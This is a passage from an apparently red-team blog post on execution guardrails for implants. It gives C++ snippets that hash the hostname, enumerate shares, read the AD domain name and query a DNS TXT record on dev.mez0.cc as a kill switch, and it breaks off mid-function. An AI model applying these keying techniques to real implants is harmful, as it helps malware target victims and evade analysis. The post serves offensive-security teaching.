https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1353&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=6df6615665eba42323a673df21d1602c 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=3d6cbe302e43fecda86f7934443d2f1f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1353&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=74fb8dbbb0d34abf3616ff633ace5dea 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=347296de7e38a7461cfe2b42df1d08f4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1353&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=6df6615665eba42323a673df21d1602c 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=1e66f16740b0ac59cef4a6c3c6968df8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1353&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=74fb8dbbb0d34abf3616ff633ace5dea 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=b18582de3dccadc250cf64a16b114727, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=f327e4e9115036349d0cfe31195c40f0 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=18375f0765ebbc4150a81f970b528912, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=5d764db46f3da8e5f6fd7a9a80fc1fe9 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=88dbf6a990f8cb658bbe71df6037c3d1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=60c5fafc69b257b364c73f8255abc6c5 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=0c65d5faf9199906838afdb983dd0e67, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=51489aa942daf1d42cef8ce2213e4f95 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828805&amp;s=0c65d5faf9199906838afdb983dd0e67" loading="lazy" x-data="image({mq1024:{width:902,height:436},mq768:{width:902,height:436},mq320:{width:720,height:348},DEFAULT:{width:320,height:155}})" :width="getSize()" :height="getSize('height')" alt="" width="902" height="436" style="opacity: 1;"></picture></div><p class="MsoNormal">It starts with a general local host check—i.e., the hostname is X, or file Y exists. If that is successful, it moves on to a network level check. This could be domain X, or <span><strong><em>SYSVOL</em></strong></span> file Y exists. And if both pass, we add an extra control that is external and controllable by us at any time. This consists of both a hosted payload and a kill switch. The kill switch in this scenario is a value in a <span><strong><em>TXT</em></strong></span> record. Obviously, if any of these checks fail, we exit.</p><p class="MsoNormal">All three of these steps have a ton of potential solutions. But, for the sake of the blog, we will keep it simple. Additionally, the code snippet provided does not comply with OpSec safe restrictions. Therefore, strings will just be shoved into the binary. In a real scenario, string obfuscation must then be considered, or else your keys are just sitting there.</p><p class="MsoNormal">Before moving on to the rest of the blog, it’s worth mentioning here that you can argue the hashing algorithm and storing of the hashes all day, but that’s out of scope for this blog. Samples can be seen using SHA256, MD5, Fowler–Noll–Vo, DBJ2, or whatever your heart desires. We will focus on SHA256 for simplicity.</p><h2 id="Local">1.3&nbsp;Local Machine</h2><p class="MsoNormal">For this component, there are a ton of potential things to key against, like <span><strong><em>MachineGuid</em></strong></span> in <span><strong><em>SOFTWARE\\Microsoft\\Cryptography</em></strong></span> or the hostname, expected user, environmental variables, directory listings—the world is your oyster. Let’s take a simple example for hostname.</p><p class="MsoNormal">Getting the hostname is easy with <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea">GetComputerNameA</a>:</p><pre><code data-highlighted="yes" class="hljs language-lua">std::<span class="hljs-built_in">string</span> GetComputerName() {
    DWORD bufferSize = MAX_COMPUTERNAME_LENGTH + <span class="hljs-number">1</span>;
    <span class="hljs-built_in">char</span> buffer[MAX_COMPUTERNAME_LENGTH + <span class="hljs-number">1</span>];
    
    <span class="hljs-keyword">if</span> (GetComputerNameA(buffer, &amp;bufferSize)) {
        <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">string</span>(buffer);
    } <span class="hljs-keyword">else</span> {
        DWORD <span class="hljs-built_in">error</span> = GetLastError();
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Error: "</span> + std::to_string(<span class="hljs-built_in">error</span>);
    }
}</code></pre><p class="MsoNormal">Calculating the SHA256 with the wincrypt functions like <a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta">CryptAcquireContextA</a><span>:</span></p><pre><code data-highlighted="yes" class="hljs language-cpp"><span class="hljs-function">std::string <span class="hljs-title">get_sha256</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; input)</span> </span>{
    HCRYPTPROV hProv = <span class="hljs-number">0</span>;
    HCRYPTHASH hHash = <span class="hljs-number">0</span>;
    std::vector&lt;BYTE&gt; buffer;
    DWORD cbHash = <span class="hljs-number">0</span>;
    DWORD dwBufferLen = <span class="hljs-number">0</span>;
    std::string hash_string;

    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptAcquireContext</span>(&amp;hProv, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }

    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptCreateHash</span>(hProv, CALG_SHA_256, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;hHash)) {
        <span class="hljs-built_in">CryptReleaseContext</span>(hProv, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }

    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptHashData</span>(hHash, <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> BYTE*&gt;(input.<span class="hljs-built_in">c_str</span>()), input.<span class="hljs-built_in">length</span>(), <span class="hljs-number">0</span>)) {
        <span class="hljs-built_in">CryptDestroyHash</span>(hHash);
        <span class="hljs-built_in">CryptReleaseContext</span>(hProv, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }

    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptGetHashParam</span>(hHash, HP_HASHSIZE, <span class="hljs-built_in">reinterpret_cast</span>&lt;BYTE*&gt;(&amp;cbHash), &amp;dwBufferLen, <span class="hljs-number">0</span>)) {
        <span class="hljs-built_in">CryptDestroyHash</span>(hHash);
        <span class="hljs-built_in">CryptReleaseContext</span>(hProv, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }

    buffer.<span class="hljs-built_in">resize</span>(cbHash);

    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptGetHashParam</span>(hHash, HP_HASHVAL, &amp;buffer[<span class="hljs-number">0</span>], &amp;cbHash, <span class="hljs-number">0</span>)) {
        <span class="hljs-built_in">CryptDestroyHash</span>(hHash);
        <span class="hljs-built_in">CryptReleaseContext</span>(hProv, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }

    std::ostringstream oss;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; byte : buffer) {
        oss &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; std::<span class="hljs-built_in">setw</span>(<span class="hljs-number">2</span>) &amp;lt;&amp;lt; std::<span class="hljs-built_in">setfill</span>(<span class="hljs-string">'0'</span>) &amp;lt;&amp;lt; <span class="hljs-keyword">static_cast</span>&amp;lt;<span class="hljs-type">int</span>&amp;gt;(byte);
    }
    hash_string = oss.<span class="hljs-built_in">str</span>();

    <span class="hljs-built_in">CryptDestroyHash</span>(hHash);
    <span class="hljs-built_in">CryptReleaseContext</span>(hProv, <span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> hash_string;
}</code></pre><p class="MsoNormal">Finally, doing the actual comparison in a very naïve way:</p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">strings_equal</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> std::<span class="hljs-built_in">string</span>&amp; str1, <span class="hljs-keyword">const</span> std::<span class="hljs-built_in">string</span>&amp; str2</span>)</span> {
    <span class="hljs-keyword">return</span> str1 == str2;
}</code></pre><p class="MsoNormal">Executing this on a system where the hostname is <span><strong><em>WIZARD </em></strong></span>(<span><strong><em>f2bf44269b54b0ee26aab45fa61c69467ecc8fac375b09e8eb055d3dbb90d89b</em></strong></span>), we can compare the hashes and hit a true or false:</p><div class="my-p56 flex justify-center text-center"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=a310f9c8c296cee1a4fa20482e89aec1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=774&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=113cd5cc8c307e8f59558d1b29b00a2c 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=bceaab4c7896ba6e22e19178662a6a64, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=774&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=18495f35a78aaa66e88c965b02e63b7e 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=76c80a095baf2c722b4194766f6c7572, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=774&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=113cd5cc8c307e8f59558d1b29b00a2c 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=db8e8801daf097298f5e601dcbbe47d2, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=774&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=18495f35a78aaa66e88c965b02e63b7e 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=a44550aee43d74049b5b0f1c41f90ea1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=774&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=113cd5cc8c307e8f59558d1b29b00a2c 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=351fd7178b41128fb8ea2dac1b580610, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=774&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=18495f35a78aaa66e88c965b02e63b7e 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=1304e71e684f4b5e420ff9a1d27f63b4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=479&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828809&amp;s=0a0cf4a0ec581ca114fabb9e38cf2d97 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=de1d5fc25868e402dc06efec06f11401, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=479&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=91a49b8afdd50c5e970e98e76d17d7a5 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig5_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828809&amp;s=de1d5fc25868e402dc06efec06f11401" loading="lazy" x-data="image({mq1024:{width:516,height:76},mq768:{width:516,height:76},mq320:{width:516,height:76},DEFAULT:{width:319,height:47}})" :width="getSize()" :height="getSize('height')" alt="" width="516" height="76" style="opacity: 1;"></picture></div><p class="MsoNormal">That’s the general logic and it can be adopted and repeated for as many local host checks as required. A concern here is golden images. If all/most machines in an environment derive from the same base, then a lot of the local host components may be the same.</p><h2 id="Network">1.4&nbsp;Network&nbsp;Keying</h2><p class="MsoNormal">In addition to making a comparison, another viable action would be to just check if something exists. For example, the function below can be used to check if shares are accessible.</p><pre><code data-highlighted="yes" class="hljs language-cpp"><span class="hljs-function">std::vector&lt;std::string&gt; <span class="hljs-title">get_network_shares</span><span class="hljs-params">()</span> </span>{
    std::vector&lt;std::string&gt; shares;
    PSHARE_INFO_1 pShareInfo = <span class="hljs-literal">nullptr</span>;
    DWORD entriesRead = <span class="hljs-number">0</span>;
    DWORD totalEntries = <span class="hljs-number">0</span>;
    DWORD resumeHandle = <span class="hljs-number">0</span>;
    NET_API_STATUS status;

    <span class="hljs-keyword">do</span> {
        status = <span class="hljs-built_in">NetShareEnum</span>(
            <span class="hljs-literal">NULL</span>,
            <span class="hljs-number">1</span>,
            (LPBYTE*)&amp;pShareInfo,
            MAX_PREFERRED_LENGTH,
            &amp;entriesRead,
            &amp;totalEntries,
            &amp;resumeHandle
        );

        <span class="hljs-keyword">if</span> (status == NERR_Success || status == ERROR_MORE_DATA) {
            <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &amp;lt; entriesRead; i++) {
                shares.<span class="hljs-built_in">push_back</span>(pShareInfo[i].shi1_netname);
            }
        }

        <span class="hljs-keyword">if</span> (pShareInfo) {
            <span class="hljs-built_in">NetApiBufferFree</span>(pShareInfo);
            pShareInfo = <span class="hljs-literal">nullptr</span>;
        }

    } <span class="hljs-keyword">while</span> (status == ERROR_MORE_DATA);

    <span class="hljs-keyword">return</span> shares;
}</code></pre><p class="MsoNormal">Naturally, this could also be used to check for specific shares, hash a concatenated string of all the names, and so on. Another one could be to reuse the SHA256 logic from the local machine section and compare hashes of the Active Directory domain name:</p><pre><code data-highlighted="yes" class="hljs language-cpp"><span class="hljs-function">std::string <span class="hljs-title">get_domain_name</span><span class="hljs-params">()</span> </span>{
    PDOMAIN_CONTROLLER_INFO pDCI = <span class="hljs-literal">NULL</span>;
    std::string domainName;

    DWORD dwRetVal = <span class="hljs-built_in">DsGetDcNameA</span>(
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        DS_RETURN_DNS_NAME,
        &amp;pDCI
    );

    <span class="hljs-keyword">if</span> (dwRetVal == ERROR_SUCCESS) {
        <span class="hljs-keyword">if</span> (pDCI) {
            domainName = pDCI-&gt;DomainName;
            <span class="hljs-built_in">NetApiBufferFree</span>(pDCI);
        }
    } <span class="hljs-keyword">else</span> {
        domainName = <span class="hljs-string">"Error: "</span> + std::<span class="hljs-built_in">to_string</span>(dwRetVal);
    }
    <span class="hljs-keyword">return</span> domainName;
}</code></pre><div class="my-p56 flex justify-center text-center"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=2b672b214cb1b6a43115fcf3b29e537a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=783&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=8d609dd7dac8fcaefccbf3f65afff773 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=e89293df9e6572ae3976a75c1321bc35, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=783&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=1b0244f095688337e63ed285cb3116b7 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=e6b8d7264492a1eb06ce53103cac9664, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=783&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=8d609dd7dac8fcaefccbf3f65afff773 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=107e68da29c58558f081f8e2039cbeea, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=783&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=1b0244f095688337e63ed285cb3116b7 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=0ee353c5e49f93d9aeb21cac53acbd82, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=783&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=8d609dd7dac8fcaefccbf3f65afff773 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=ea600279799aeb058916fa1e74125390, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=783&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=1b0244f095688337e63ed285cb3116b7 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=2bf0ea2ea6ff9cfb7e8250547d9cf247, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828811&amp;s=fd3ed11eb277502ab61d2ed749fea4f8 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=b3c71b8751d05d9f87fc075f8f4b9576, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=bf447321b799d1dd483dc5a3f8ac6592 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig8_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828811&amp;s=b3c71b8751d05d9f87fc075f8f4b9576" loading="lazy" x-data="image({mq1024:{width:522,height:132},mq768:{width:522,height:132},mq320:{width:522,height:132},DEFAULT:{width:320,height:81}})" :width="getSize()" :height="getSize('height')" alt="" width="522" height="132" style="opacity: 1;"></picture></div><p class="MsoNormal">Having an additional layer of keying, but this time focused on the network, provides just that extra bit of control and aims to ensure that this is 100% the correct environment.</p><h2 id="External">1.5&nbsp;External Resources</h2><p class="MsoNormal">At this point, the local machine and network are confirmed. To give us that extra layer of control, we can implement a pseudo-kill switch into the execution flow that will allow us to disarm the implant. Two use cases come to mind:</p><ol start="1"><li>&nbsp;A “keying” process that causes the implant to reach out to a resource and validate the response; if correct, continue—otherwise, exit.</li><li>A native staging solution that sends in the next component of the implant; in most scenarios, this should occur anyway, outside of the keying process. But, we will discuss it here anyway, as the concept is relevant.</li></ol><p class="MsoNormal">To implement a kill switch, we can do a simple query to <span><strong><em>dev.mez0.cc</em></strong></span> that will have a GUID stored (<span><strong><em>8cf73556-6c58-4bf3-8e1e-b2b7658f8a45)</em></strong></span>.</p><div class="my-p56 flex justify-center text-center"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=a0dafe9f1baac6c2e39148f7c9508286, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=849&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=802c855b9a72cbc2b1c5eac5c791302b 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=5f05e4aea43c638abe3245c5cc851754, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=849&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=a21b3eceeb3ace83d9c293cd72d8eb5f 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=693b1df65405b06ca9ef94f224bb75b7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=849&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=802c855b9a72cbc2b1c5eac5c791302b 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=9663e940564daeb1109056de6552d705, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=849&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=a21b3eceeb3ace83d9c293cd72d8eb5f 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=c9643ff88185dd5b91e74b3e8d013d64, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=849&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=802c855b9a72cbc2b1c5eac5c791302b 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=6e94cda4c907b874ee42395c2297d4ac, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=849&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=a21b3eceeb3ace83d9c293cd72d8eb5f 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=3542a9ee5fb9c9dd58b14ee556e65fc7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828812&amp;s=00776a32ce59ab2ced2735a8b86c492e 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=0aeaf34604a61ebb7308e4569a920d63, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=32917e19b01125b20f12380310708e70 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig9_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828812&amp;s=0aeaf34604a61ebb7308e4569a920d63" loading="lazy" x-data="image({mq1024:{width:566,height:150},mq768:{width:566,height:150},mq320:{width:566,height:150},DEFAULT:{width:320,height:85}})" :width="getSize()" :height="getSize('height')" alt="" width="566" height="150" style="opacity: 1;"></picture></div><p class="MsoNormal">It's straightforward to do this with <a href="https://learn.microsoft.com/en-us/windows/win32/api/windns/nf-windns-dnsquery_a">DnsQuery_A</a>.</p><pre><code data-highlighted="yes" class="hljs language-cpp"><span class="hljs-function">std::string <span class="hljs-title">get_txt_record</span><span class="hljs-params">()</span> </span>{
    PDNS_RECORDA txt_record = <span class="hljs-literal">nullptr</span>;
    
    DNS_STATUS status = <span class="hljs-built_in">DnsQuery_A</span>(
        <span class="hljs-string">"dev.mez0.cc"</span>,
        DNS_TYPE_TEXT,
        DNS_QUERY_STANDARD,
        <span class="hljs-literal">NULL</span>,
        &amp;txt_record,
        <span class="hljs-literal">NULL</span>
    );

